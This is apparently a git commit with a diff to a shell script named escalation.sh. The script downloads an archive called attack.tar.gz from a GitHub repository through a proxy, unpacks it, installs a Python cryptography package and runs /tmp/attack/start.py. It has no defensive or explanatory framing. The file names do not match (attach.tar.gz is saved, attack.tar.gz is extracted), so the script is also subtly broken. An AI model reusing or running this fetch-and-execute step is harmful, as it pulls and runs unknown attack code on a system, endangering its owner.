2b97212b9c2482e729a520cbc56c08d122903c53
comet959 <1376723538@qq.com>
2026-01-12 22:54:19 +0800

    update

--- escalation.sh
+++ escalation.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
 
-curl -L https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz -o /tmp/attach.tar.gz
-tar xzvf /tmp/attack.tar.gz
+curl -L https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz -o /tmp/attach.tar.gz && tar xzvf /tmp/attack.tar.gz
 pip3 install cryptography
 python3 /tmp/attack/start.py
